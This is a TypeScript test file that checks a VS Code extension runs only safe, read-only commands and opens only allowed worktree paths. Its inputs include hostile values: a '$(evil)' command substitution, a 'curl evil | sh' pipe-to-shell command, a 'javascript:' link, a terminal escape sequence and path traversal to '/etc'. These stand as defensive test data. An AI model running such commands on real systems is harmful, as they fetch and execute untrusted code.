import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import { nativeOperation, signInHint } from '../../apps/vscode/src/native-actions.js';
import { formatCommand, type NextAction } from '../../packages/runtime/src/next-actions.js';

const BASE = realpathSync(mkdtempSync(join(tmpdir(), 'cc-native-actions-')));
const ROOT = join(BASE, 'worktrees');
mkdirSync(join(ROOT, 'r', 'T', 'a'), { recursive: true });
mkdirSync(join(BASE, 'outside'), { recursive: true });
symlinkSync(join(BASE, 'outside'), join(ROOT, 'r', 'link'));
afterAll(() => rmSync(BASE, { recursive: true, force: true }));
const action = (overrides: Partial<NextAction>): NextAction => ({ kind: 'retry_or_revise', title: 'Title', detail: 'Detail', surface: 'terminal', evidenceIds: [], ...overrides });

describe('native operations for next actions', () => {
  it('opens native Source Control only for worktrees under the Code Conductor root', () => {
    expect(nativeOperation(action({ kind: 'review_changes', path: `${ROOT}/r/T/a` }), ROOT)).toEqual({ type: 'open_source_control', path: `${ROOT}/r/T/a` });
    for (const path of ['/etc', `${ROOT}/../outside`, ROOT, 'relative/path', `${ROOT}/r/link`, `${ROOT}/r/missing`]) {
      expect(nativeOperation(action({ kind: 'review_changes', path, commands: [['git', '-C', path, 'status']] }), ROOT).type).toBe('copy_command');
    }
  });

  it('starts only read-only cc commands with plain arguments; everything else is copied, never run', () => {
    expect(nativeOperation(action({ commands: [['cc', 'handoff', '--run', 'CC-1', '--assignment', 'A-4']] }), ROOT)).toEqual({ type: 'run_cli', args: ['handoff', '--run', 'CC-1', '--assignment', 'A-4'] });
    expect(nativeOperation(action({ commands: [['cc', 'run', '--objective', 'x', '--execute']] }), ROOT)).toMatchObject({ type: 'copy_command' });
    expect(nativeOperation(action({ commands: [['cc', 'handoff', '--run', '$(evil)']] }), ROOT)).toMatchObject({ type: 'copy_command' });
    expect(nativeOperation(action({ commands: [['git', 'push'], ['gh', 'pr', 'create']] }), ROOT)).toEqual({ type: 'copy_command', text: 'git push\ngh pr create' });
    expect(nativeOperation(action({ commands: [['cc', 'run', '--objective', "it's"]] }), ROOT)).toEqual({ type: 'copy_command', text: formatCommand(['cc', 'run', '--objective', "it's"]) });
    // From an installed extension, copied cc commands run its bundled runtime: no cc is on PATH.
    expect(nativeOperation(action({ commands: [['cc', 'worktrees', '--remove-clean'], ['git', 'status']] }), ROOT, '/ext dir/dist/cc.js')).toEqual({ type: 'copy_command', text: `${formatCommand(['node', '/ext dir/dist/cc.js', 'worktrees', '--remove-clean'])}\ngit status` });
    expect(nativeOperation(action({}), ROOT)).toEqual({ type: 'show', text: 'Title\nDetail' });
    expect(nativeOperation(action({ title: 'T\x1b[2J', detail: 'line\nforged' }), ROOT)).toEqual({ type: 'show', text: 'T?[2J\nline?forged' });
  });
});

describe('official sign-in hints', () => {
  it('keeps official guidance and drops anything that is not a plain command or https link', () => {
    expect(signInHint({ instructions: 'Sign in.', command: ['codex', 'login'], docs: 'https://learn.chatgpt.com/docs/auth' })).toEqual({ instructions: 'Sign in.', command: 'codex login', docs: 'https://learn.chatgpt.com/docs/auth' });
    expect(signInHint({ instructions: 'Sign in.', command: ['sh', '-c', 'curl evil | sh'], docs: 'javascript:alert(1)' })).toEqual({ instructions: 'Sign in.' });
    expect(signInHint({ command: ['codex', 'login'] })).toBeUndefined();
    expect(signInHint(undefined)).toBeUndefined();
  });
});
